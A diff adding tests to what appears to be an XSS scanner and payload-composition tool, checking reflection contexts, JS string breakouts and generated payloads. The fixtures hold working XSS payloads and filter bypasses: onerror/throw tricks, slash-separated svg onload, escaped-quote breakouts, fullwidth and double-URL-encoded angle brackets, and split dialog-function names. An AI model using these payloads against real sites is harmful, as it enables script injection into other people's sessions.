@@ -11,8 +11,11 @@ import sys
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import js_verify                          # noqa: E402
+from check_reflection import (            # noqa: E402
+    compute_js_breakout, inspect_reflection_point)
 from recommend_payload import (           # noqa: E402
-    classify_response, _parse_response, _core_payload)
+    classify_response, _parse_response, _core_payload, compose,
+    avail_funcs, encoded_funcs, u_funcs, u6_funcs, bracket_funcs)
 
 M = "vvmabc"  # deterministic marker for fixtures
 
@@ -103,12 +106,143 @@ def run():
          '"-alert(1)-"', "V", "CSP note appended"),
         (200, {}, '<title>"-alert(1)-"<!--vvmabc--></title>',
          '"-alert(1)-"', "R", "marker in inert title -> R"),
+        # B3: rawtext / inert container guards
+        (200, {}, '<textarea><img src=x vvmabc onerror=alert(1)></textarea>',
+         '<img src=x vvm{id} onerror=alert(1)>', "R",
+         "B3: unclosed textarea traps img onerror -> R"),
+        (200, {}, '<template><script vvmabc>alert(1)</script></template>',
+         '<script vvm{id}>alert(1)</script>', "R",
+         "B3: template traps script -> R"),
+        (200, {}, '<script type="application/json">"-alert(1)-"<!--vvmabc--></script>',
+         '"-alert(1)-"', "R",
+         "B3: application/json script block is non-executable -> R"),
+        (200, {}, '<textarea></textarea><img src=x vvmabc onerror=alert(1)>',
+         '</textarea><img src=x vvm{id} onerror=alert(1)>', "V",
+         "B3: closing </textarea> before img onerror -> V"),
+        # A2: escaped-quote breakout (addslashes turns \" into \\")
+        (200, {}, '<script>var q="\\\\"-alert(1)-\\\\"<!--vvmabc-->";</script>',
+         '\\"-alert(1)-\\"', "V",
+         "A2: escaped-quote breakout \\\" -> \\\\\" frees quote -> V"),
+        # B4: DOM & navigation assignment sinks without throw
+        (200, {}, '<script>var q="";el.innerHTML=x;/*vvmabc*/</script>',
+         '";el.innerHTML=x;/*vvm{id}*/', "V",
+         "B4: innerHTML assignment sink without throw -> V"),
+        (200, {}, '<script>var q="";location="javascript:alert(1)";/*vvmabc*/</script>',
+         '";location="javascript:alert(1)";/*vvm{id}*/', "V",
+         "B4: location=javascript: assignment sink -> V"),
+        (200, {}, '<script>var q="";location="/safe";/*vvmabc*/</script>',
+         '";location="/safe";/*vvm{id}*/', "R",
+         "B4: benign location=\"/safe\" is NOT a sink -> R"),
+        (200, {}, '<input value="" autofocus onfocus="onerror=alert;throw 1/*vvmabc*/">',
+         '" autofocus onfocus="onerror=alert;throw 1', "R",
+         "bare onerror= in <input onfocus> is shadowed by element.onerror -> R"),
+        (200, {}, '<input value="" autofocus onfocus="self.onerror=alert;throw 1/*vvmabc*/">',
+         '" autofocus onfocus="self.onerror=alert;throw 1', "V",
+         "self.onerror= in <input onfocus> binds window.onerror -> V"),
     ]
     for status, hdrs, body, payload, want, label in fcases:
         got = classified(status, body, payload, hdrs)
         conf = got["confidence"]
         t.append((label, conf == want,
                   f"want={want} got={conf} | {got['evidence']}"))
+
+    # --- B1 & B2: context, per-reflection quote, and JS structural closer -
+    ctxs, q, brk = inspect_reflection_point(
+        '<input type="text" placeholder="testing1abc">', "testing1abc")
+    t.append(("B1: placeholder attr detected as attr with dquote",
+              ctxs == ["attribute value (quotes NOT encoded)"] and q == '"',
+              f"ctxs={ctxs} q={q!r}"))
+    ctxs2, q2, _ = inspect_reflection_point(
+        "<div data-search='testing1abc'></div>", "testing1abc")
+    t.append(("B1: data-* attr detected with squote",
+              ctxs2 == ["attribute value (quotes NOT encoded)"] and q2 == "'",
+              f"ctxs={ctxs2} q={q2!r}"))
+    ctxs3, q3, _ = inspect_reflection_point(
+        "<input value=testing1abc>", "testing1abc")
+    t.append(("B1: unquoted attr detected with empty quote",
+              ctxs3 == ["attribute value (quotes NOT encoded)"] and q3 == "",
+              f"ctxs={ctxs3} q={q3!r}"))
+    jctx, jq, jcloser = compute_js_breakout(
+        'function f() { var cfg = { a: ["')
+    t.append(("B2: compute_js_breakout nested closer",
+              jctx == "javascript string" and jq == '"' and jcloser == '"]}}',
+              f"jctx={jctx} jq={jq!r} jcloser={jcloser!r}"))
+
+    # --- A2, A4, A5, B2: compose() synthesis checks -----------------------
+    sc_no_angle = {"'": 100, '"': 100, "<": 0, ">": 0, "/": 100, "\\": 100}
+    c_b2 = compose("js_string", '"', sc_no_angle, js_breakout='"]}}')
+    t.append(("B2: compose emits structural closer candidate",
+              any('"]}};alert(1)' in c["payload"] for c in c_b2),
+              str([c["payload"] for c in c_b2])))
+    sc_esc_q = {"'": 100, '"': 50, "<": 0, ">": 0, "/": 100, "\\": 50}
+    c_a2 = compose("js_string", '"', sc_esc_q, escaped_q={'"'},
+                   js_breakout='"]}')
+    t.append(("A2+B2: compose emits escaped-quote & structural closer",
+              any(c["payload"].startswith('\\"') for c in c_a2)
+              and any('\\"]};alert(1)' in c["payload"] for c in c_a2),
+              str([c["payload"] for c in c_a2])))
+    c_a4 = compose("attr", '"', sc_no_angle, kw={"space": False})
+    t.append(("A4: compose emits slash-separated attr injection when space dead",
+              any('"/autofocus/onfocus="' in c["payload"] for c in c_a4),
+              str([c["payload"] for c in c_a4])))
+    sc_no_gt = {"'": 100, '"': 100, "<": 100, ">": 0, "/": 100, "\\": 100}
+    c_a4_gt = compose(
+        "html", "", sc_no_gt,
+        kw={"space": False, "svg_tag": False, "onload": True,
+            "pair_svg_onload": False, "call_alert": False},
+        kwv={"svg_tag": ("<svg>", "<svg")}, fn_cap=8)
+    t.append(("A4+gt_missing: slash-separated <svg/.../onload=...// when '>' and ' ' dead",
+              any(c["payload"].startswith("<svg/vvm{id}/onload=")
+                  and c["payload"].endswith("//") for c in c_a4_gt),
+              str([c["payload"] for c in c_a4_gt[:6]])))
+    c_a5 = compose("html", "", sc_no_angle,
+                   kwv={"fullwidth_lt": ("\uff1c", "<"),
+                        "double_url_lt": ("%3c", "<")})
+    t.append(("A5: compose emits double-url and fullwidth angle bypasses",
+              any(c["payload"].startswith("%3c") for c in c_a5)
+              and any(c["payload"].startswith("\uff1c") for c in c_a5),
+              str([c["payload"] for c in c_a5])))
+
+    # --- Blocked-alert & call-mode symmetry across all fn builders --------
+    kw_no_calls_no_names = {
+        "parentheses": False, "backtick": False,
+        "gen_call": False, "gen_tick": False,
+        "alert": False, "confirm": False, "prompt": False, "print": False,
+        "char_ref": True, "gen_u6brace": True, "gen_bracket": True,
+    }
+    bf_throw = bracket_funcs(kw_no_calls_no_names)
+    t.append(("bracket_funcs throw-mode covers all splits incl self['con'+'firm']",
+              "onerror=self['con'+'firm'];throw 1" in bf_throw
+              and "onerror=self['pr'+'ompt'];throw 1" in bf_throw
+              and "onerror=self['pr'+'int'];throw 1" in bf_throw,
+              str(bf_throw[:12])))
+    ef_throw = encoded_funcs(kw_no_calls_no_names)
+    uf_throw = u_funcs(kw_no_calls_no_names)
+    u6_throw = u6_funcs(kw_no_calls_no_names)
+    t.append(("encoded/u/u6_funcs throw-mode covers all 4 dialog fns",
+              len(ef_throw) >= 4 and len(uf_throw) == 8 and len(u6_throw) == 8
+              and all(x.startswith("onerror=")
+                      and (x.endswith(";throw 1") or x.endswith(";throw-1"))
+                      for x in uf_throw + u6_throw),
+              f"ef={len(ef_throw)} uf={uf_throw} u6={u6_throw}"))
+    af_confirm = avail_funcs({
+        "parentheses": False, "backtick": False,
+        "gen_call": False, "gen_tick": False,
+        "alert": False, "confirm": True, "prompt": False, "print": False,
+    })
+    t.append(("avail_funcs throw-mode falls back to surviving confirm",
+              af_confirm == ["onerror=confirm;throw 1",
+                             "onerror=confirm;throw-1"],
+              str(af_confirm)))
+    af_space_dead = avail_funcs({
+        "parentheses": False, "backtick": False,
+        "gen_call": False, "gen_tick": False, "space": False,
+        "alert": True, "confirm": False, "prompt": False, "print": False,
+    })
+    t.append(("avail_funcs throw-mode space-free ops when ' ' dead",
+              af_space_dead == ["onerror=alert;throw-1",
+                                "onerror=alert;throw/1/"],
+              str(af_space_dead)))
 
     # --- _parse_response / _core_payload ----------------------------------
     st, hd, bd = _parse_response(
